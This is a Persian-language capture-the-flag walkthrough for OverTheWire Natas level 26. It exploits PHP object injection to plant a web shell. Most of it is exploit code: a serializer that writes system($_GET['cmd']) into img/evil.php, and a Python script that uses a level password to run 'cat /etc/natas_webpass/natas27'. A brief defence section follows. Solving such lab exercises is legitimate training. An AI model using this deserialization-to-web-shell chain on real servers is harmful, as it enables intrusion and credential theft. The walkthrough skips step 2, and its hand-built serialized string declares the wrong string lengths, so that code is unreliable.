۲۶ تزریق شیء PHP — Deserialization پیشرفته
// مفاهیم کلیدی
تزریق شیء PHP Deserialization داده سریال‌شده اجرای کد از راه دور (RCE) __destruct()
// مرور کلی چالش

این سطح تزریق شیء PHP را نشان می‌دهد. برنامه داده‌های ارائه‌شده توسط کاربر را بدون اعتبارسنجی مناسب deserialize می‌کند و به مهاجم اجازه می‌دهد اشیاء دلخواه را تزریق کند که می‌توانند منجر به اجرای کد از راه دور شوند.

// تحلیل اولیه

کد منبع را بررسی کنید:

<?php class Logger { public $logFile; public $initMsg; public $exitMsg; function __construct() { $this->logFile = "img/log.txt"; $this->initMsg = "Log file initialized"; $this->exitMsg = "Log file closed"; } function __destruct() { file_put_contents($this->logFile, $this->initMsg . "\n" . $this->exitMsg); } } if (isset($_GET["data"])) { $data = base64_decode($_GET["data"]); $obj = unserialize($data); if (get_class($obj) == "Logger") { echo "Logger object created"; } } ?>

برنامه داده‌ها را از پارامتر data deserialize می‌کند و بررسی می‌کند که آیا یک شیء Logger است یا خیر. متد __destruct() با استفاده از ویژگی‌های کنترل‌شده توسط مهاجم در یک فایل می‌نویسد.

💡 تزریق شیء PHP زمانی رخ می‌دهد که داده‌های سریال‌شده ارائه‌شده توسط کاربر بدون اعتبارسنجی deserialize شوند. مهاجمان می‌توانند ویژگی‌های اشیاء را کنترل کنند که منجر به رفتار غیرمنتظره یا اجرای کد از راه دور می‌شود.
// مراحل حل

مرحله ۱ — ایجاد شیء سریال‌شده مخرب:

باید یک شیء Logger با مسیر فایلی ایجاد کنیم که امکان اجرای کد را فراهم کند. یک اسکریپت PHP برای تولید داده سریال‌شده بنویسیم:

<?php class Logger { public $logFile = "img/evil.php"; public $initMsg = "<?php system(\$_GET['cmd']); ?>"; public $exitMsg = "<?php system(\$_GET['cmd']); ?>"; } $obj = new Logger(); echo base64_encode(serialize($obj)); ?>

مرحله ۳ — دسترسی به فایل تزریق شده:

http://natas26.natas.labs.overthewire.org/img/evil.php?cmd=cat /etc/natas_webpass/natas27

با استفاده از Python:

import requests import base64 payload = 'O:6:"Logger":3:{s:7:"logFile";s:12:"img/evil.php";s:7:"initMsg";s:33:"<?php system($_GET[\'cmd\']); ?>";s:7:"exitMsg";s:33:"<?php system($_GET[\'cmd\']); ?>";}' encoded = base64.b64encode(payload.encode()).decode() url = "http://natas26.natas.labs.overthewire.org/" auth = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T") params = {"data": encoded} response = requests.get(url, auth=auth, params=params) url2 = "http://natas26.natas.labs.overthewire.org/img/evil.php" params2 = {"cmd": "cat /etc/natas_webpass/natas27"} response2 = requests.get(url2, auth=auth, params=params2) print(response2.text)
// چرا کار می‌کند

تزریق شیء PHP به دلیل موارد زیر کار می‌کند:

  • Deserialization ناامن: برنامه از unserialize() روی ورودی کاربر استفاده می‌کند.
  • ویژگی‌های کنترل‌شده: مهاجم می‌تواند ویژگی‌های شیء را کنترل کند.
  • متد جادویی: متد __destruct() به طور خودکار فراخوانی می‌شود.
// اقدامات دفاعی
  • هرگز داده‌های ناامن را deserialize نکنید.
  • به جای serialize() و unserialize() از JSON استفاده کنید.
  • اگر deserialization ضروری است، از یک لیست سفید از کلاس‌های مجاز استفاده کنید.

📦 Deserialization خطرناک است

Deserializing داده‌های ارائه‌شده توسط کاربر می‌تواند منجر به اجرای کد از راه دور شود. هرگز داده‌های ناامن را بدون محافظت deserialize نکنید.

🛡️ از JSON استفاده کنید

JSON جایگزین امن‌تری برای serialization PHP است. از نمونه‌سازی شیء یا اجرای متد جادویی پشتیبانی نمی‌کند.
